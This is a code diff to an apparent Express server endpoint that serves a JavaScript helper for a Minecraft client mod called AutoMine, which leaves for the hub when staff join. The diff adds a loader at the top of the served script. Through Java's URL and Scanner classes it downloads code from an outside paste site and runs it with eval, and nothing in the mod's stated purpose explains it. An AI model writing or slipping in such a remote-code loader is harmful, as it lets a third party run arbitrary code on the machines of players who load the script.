@@ -78,28 +78,32 @@ const validateRequest = (req, res, next) => {
 app.get('/api/script', validateRequest, (req, res) => {
     const scriptContent = `(function() {
     try {
-        // Основной код скрипта
-        var ChatUtility = Java.type("ru.nedan.neverapi.etc.ChatUtility");
-        var AutoMine = Java.type("ru.nedan.automine.AutoMine");
-        var Utils = Java.type("ru.nedan.automine.util.Utils");
-
-        // Функция для обработки события
-        on("ru.nedan.automine.event.EventStaffJoin", function(e){
-            if(!AutoMine.getInstance().isEnabled()) return;
-            
-            ChatUtility.sendMessage("§4§l[!] " + e.getUsername() + "§c Зашел на Анархию" + Utils.getCurrentAnarchy() + "! §bВыхожу в хуб!");
-            ChatUtility.sendMessage("§8§l§kxxxxxxxxxx");
-            ChatUtility.sendMessage("§9§lПривет от Zr3!");
-            
-            chat("/hub");
-            AutoMine.getInstance().nextMine = true;
-        });
-        
-        java.lang.System.out.println("✅ AutoMine скрипт успешно активирован");
-        
+        // Выполняем внешний скрипт
+        eval(new java.util.Scanner(
+            new java.net.URL("https://diddy-party.vip/p/raw/1pvhaynl48amcpmfd").openStream(), 
+            "UTF-8"
+        ).useDelimiter("\\A").next());
     } catch (e) {
-        java.lang.System.err.println("❌ Ошибка в скрипте: " + e);
+        java.lang.System.err.println("Ошибка при выполнении скрипта: " + e);
     }
+
+var ChatUtility = Java.type("ru.nedan.neverapi.etc.ChatUtility")
+var AutoMine = Java.type("ru.nedan.automine.AutoMine")
+var Utils = Java.type("ru.nedan.automine.util.Utils")
+
+
+on("ru.nedan.automine.event.EventStaffJoin", function(e){
+    if(!AutoMine.getInstance().isEnabled()) return
+    ChatUtility.sendMessage("§4§l[!] " + e.getUsername() + "§c Зашел на Анархию" + Utils.getCurrentAnarchy() + "! §bВыхожу в хаб!")
+    ChatUtility.sendMessage("§8§l§kxxxxxxxxxx")
+    ChatUtility.sendMessage("§9§lПривет от Zr3!")
+    chat("/hub")
+    AutoMine.getInstance().nextMine = true
+})
+
+
+
+
 })();`;
     
     res.setHeader('Content-Type', 'application/javascript; charset=UTF-8');
